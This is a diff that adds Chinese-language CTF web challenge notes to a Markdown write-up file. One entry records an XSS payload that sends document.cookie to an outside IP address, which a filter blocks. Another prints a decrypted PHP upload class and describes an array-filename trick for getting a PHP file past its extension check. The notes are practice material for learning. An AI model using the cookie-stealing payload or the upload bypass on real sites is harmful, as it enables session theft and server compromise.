@@ -1,6 +1,6 @@
 ﻿---
 title: "web"
-lastmod: 2026-05-26T23:31:13+08:00
+lastmod: 2026-06-18T00:19:39+08:00
 draft: false
 ---
 # web
@@ -75,8 +75,167 @@ if(2===3){
 
 ?>
 ```
+## NO P185 [HCTF 2017]Deserted place
+先注册一个账号登录进去
+抓个包
+等会，发现点好东西
+访问/api/update.php的时候会出现奇怪的包
+```
+message=None&email=<img src="1" onerror="alert(1)">&csrftoken=cce4ae4e
+```
+一看就是XSS注入
+但是直接替换成`location.href='https://60.215.128.110:44202/1.php?cookie='+document.cookie`这种会出现`bad guys, what are you doing?`
+被ban了，呜呜呜
+# P179 [PWNHUB 2017]傻 fufu 的工作日
+啥也看不出来，先dirsearch扫描一下
+扫描出来一个index.php.bak，下载一下
+看到一个网站，下载下来上面的解密文件
+然后就可以解密源代码
+```php
+<?php @eval("//Encode by  phpjiami.com,Free user."); ?>
+<?php
+if($_FILES) {
+    include 'UploadFile.class.php';
+    $dist = 'upload';
+    $upload = new UploadFile($dist, 'upfile');
+    $data = $upload->upload();
+}
+?>
+```
+尝试访问一下，发现有文件UploadFile.class.php
+那么看看UploadFile.class.php.bak能不能下载
+能下载，解密以后：
+```php
+<?php @eval("//Encode by  phpjiami.com,Free user."); ?><?php
+class UploadFile {
+    public $error = '';
+    protected $field;
+    protected $allow_ext;
+    protected $allow_size;
+    protected $dist_path;
+    protected $new_path;
+    function __construct($dist_path, $field='upfile', $new_name='random', $allow_ext=['gif', 'jpg', 'jpeg', 'png'], $allow_size=102400)
+    {
+        $this->field = $field;
+        $this->allow_ext = $allow_ext;
+        $this->allow_size = $allow_size;
+        $this->dist_path = realpath($dist_path);
+        if ($new_name === 'random') {
+            $this->new_name = uniqid();
+        } elseif (is_string($new_name)) {
+            $this->new_name = $new_name;
+        } else {
+            $this->new_name = null;
+        }
+    }
+    protected function codeToMessage($code)
+    {
+        switch ($code) {
+            case UPLOAD_ERR_INI_SIZE:
+                $message = "The uploaded file exceeds the upload_max_filesize directive in php.ini";
+                break;
+            case UPLOAD_ERR_FORM_SIZE:
+                $message = "The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form";
+                break;
+            case UPLOAD_ERR_PARTIAL:
+                $message = "The uploaded file was only partially uploaded";
+                break;
+            case UPLOAD_ERR_NO_FILE:
+                $message = "No file was uploaded";
+                break;
+            case UPLOAD_ERR_NO_TMP_DIR:
+                $message = "Missing a temporary folder";
+                break;
+            case UPLOAD_ERR_CANT_WRITE:
+                $message = "Failed to write file to disk";
+                break;
+            case UPLOAD_ERR_EXTENSION:
+                $message = "File upload stopped by extension";
+                break;
+            default:
+                $message = "Unknown upload error";
+                break;
+        }
+        return $message;
+    }
+    protected function error($info)
+    {
+        $this->error = $info;
+        return false;
+    }
+    public function upload()
+    {
+        if(empty($_FILES[$this->field])) {
+            return $this->error('上传文件为空');
+        }
+        if(is_array($_FILES[$this->field]['error'])) {
+            return $this->error('一次只能上传一个文件');
+        }
+        if($_FILES[$this->field]['error'] != UPLOAD_ERR_OK) {
+            return $this->error($this->codeToMessage($_FILES[$this->field]['error']));
+        }
+        $filename = !empty($_POST[$this->field]) ? $_POST[$this->field] : $_FILES[$this->field]['name'];
+        if(!is_array($filename)) {
+            $filename = explode('.', $filename);
+        }
+        foreach ($filename as $name) {
+            if(preg_match('#[<>:"/\\|?*.]#is', $name)) {
+                return $this->error('文件名中包含非法字符');
+            }
+        }
+        if($_FILES[$this->field]['size'] > $this->allow_size) {
+            return $this->error('你上传的文件太大');
+        }
+        if(!in_array($filename[count($filename)-1], $this->allow_ext)) {
+            return $this->error('只允许上传图片文件');
+        }
+        // 用.分割文件名，只保留首尾两个字符串，防御Apache解析漏洞
+        $origin_name = current($filename);
+        $ext = end($filename);
+        $new_name = ($this->new_name ? $this->new_name : $origin_name) . '.' . $ext;
+        $target_fullpath = $this->dist_path . DIRECTORY_SEPARATOR . $new_name;
+        // 创建目录
+        if(!is_dir($this->dist_path)) {
+            mkdir($this->dist_path);
+        }
+        if(is_uploaded_file($_FILES[$this->field]['tmp_name']) && move_uploaded_file($_FILES[$this->field]['tmp_name'], $target_fullpath)) {
+            // Success upload
+        } elseif (rename($_FILES[$this->field]['tmp_name'], $target_fullpath)) {
+            // Success upload
+        } else {
+            return $this->error('写入文件失败，可能是目标目录不可写');
+        }
+        return [
+            'name' => $origin_name,
+            'filename' => $new_name,
+            'type' => $ext
+        ];
+    }
+}
+```
+尝试了几次都是上传不上去，显示上传的不符合格式
+查看关键代码：
+```php
+        if(!in_array($filename[count($filename)-1], $this->allow_ext)) {
+            return $this->error('只允许上传图片文件');
+        }
+```
+再查看前面的，我们可以直接对这个filename写成数组进行绕过
+upfile('1'->'jpg','0'->'php')
+然后只要count就是2，取出来就是1
+再看一下后面
+```php
+        $origin_name = current($filename);
+        $ext = end($filename);
+        $new_name = ($this->new_name ? $this->new_name : $origin_name) . '.' . $ext;
+        $target_fullpath = $this->dist_path . DIRECTORY_SEPARATOR . $new_name;
+```
+这个里面使用end($filename)取出数组
+所以我们用刚才的那个直接进行绕过
+![[Pasted image 20260618001929.png]]
+靶场坏掉了，就这样了
 
-## <font style="color:rgb(0, 0, 0);">P316 \[第五空间 2021]WebFTP</font>
+## P316 \[第五空间 2021]WebFTP
 
 ![1764809363581-16493624-e8d6-4c47-99b3-09626c645648.png](./img/sP6fq2n3ZbmMzTLH/1764809363581-16493624-e8d6-4c47-99b3-09626c645648-594485.png)
 
